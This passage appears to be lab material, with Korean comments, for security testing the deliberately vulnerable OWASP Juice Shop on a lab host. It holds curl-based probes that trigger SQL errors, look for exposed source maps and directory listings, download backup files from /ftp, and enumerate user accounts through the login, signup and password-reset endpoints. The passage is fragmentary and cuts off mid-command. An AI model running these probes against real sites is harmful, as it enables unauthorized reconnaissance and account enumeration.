...
test_err "404 (없는 경로)"      "curl -s 'http://juice.6v6.lab/nonexistent_xyz123'"
test_err "타입 에러 /api/x/abc"  "curl -s 'http://juice.6v6.lab/api/Products/abc'"
test_err "SQL 에러 (q=')"        "curl -s \"http://juice.6v6.lab/rest/products/search?q=%27\""
test_err "빈 JSON body"          "curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{}'"
test_err "잘못된 Content-Type"   "curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: text/plain' -d 'not json'"
test_err "매우 긴 입력 (10K)"    "curl -s \"http://juice.6v6.lab/rest/products/search?q=\$(python3 -c 'print(\"A\"*10000)')\""
```
...
```bash
# 에러 응답에서 민감 정보 추출
curl -s "http://juice.6v6.lab/rest/products/search?q='" | python3 -c "  # silent 모드
import sys, json
...
compare_404 "JuiceShop" "http://juice.6v6.lab"
...
for path in "${PATHS[@]}"; do
  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" "http://juice.6v6.lab/$path")
  if [ "$code" != "404" ]; then
...
curl -s http://juice.6v6.lab/metrics | head -30
echo "---"
echo "=== 메트릭에서 추출 가능한 민감 정보 ==="
M=$(curl -s http://juice.6v6.lab/metrics)
...
MAIN_JS=$(curl -s http://juice.6v6.lab | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
if [ -n "$MAIN_JS" ]; then
  echo "JS 파일: $MAIN_JS"
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://juice.6v6.lab/${MAIN_JS}.map")
  echo "소스맵 ($MAIN_JS.map): HTTP $code"
  if [ "$code" = "200" ]; then
    echo "소스맵 노출됨! 소스 코드 복원 가능"
    curl -s "http://juice.6v6.lab/${MAIN_JS}.map" | python3 -c "  # silent 모드
import sys, json
...
for d in "/" "/ftp" "/ftp/" "/assets" "/assets/public" "/encryptionkeys"; do
  test_listing "JuiceShop" "http://juice.6v6.lab" "$d"
done
...
echo "=== /ftp 파일 목록 ==="
curl -s http://juice.6v6.lab/ftp/ | python3 -c "    # silent 모드
import sys, json
try:
    data = json.load(sys.stdin)
...
for file in "legal.md" "acquisitions.md" "package.json.bak" "coupons_2013.md.bak" "eastere.gg"; do  # 반복문 시작
  echo "--- $file ---"
  curl -s "http://juice.6v6.lab/ftp/$file" 2>/dev/null | head -5  # silent 모드
  echo ""
done
```
...
echo "[1] 로그인 endpoint:"
test_enum "존재 admin + wrong" '{"email":"admin@juice-sh.op","password":"wrong"}' "http://juice.6v6.lab/rest/user/login"
test_enum "미존재 + wrong"     '{"email":"nobody@nowhere.com","password":"wrong"}' "http://juice.6v6.lab/rest/user/login"
echo ""
echo "[2] 회원가입 endpoint:"
test_enum "존재 admin"          '{"email":"admin@juice-sh.op","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' "http://juice.6v6.lab/api/Users/"
test_enum "신규 brand_new_xyz"  '{"email":"brand_new_xyz999@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1},"securityAnswer":"a"}' "http://juice.6v6.lab/api/Users/"
```
...
echo "=== 비밀번호 재설정 열거 ==="
echo "존재하는 이메일:"
curl -s -X POST http://juice.6v6.lab/rest/user/reset-password \
  -H "Content-Type: application/json" \
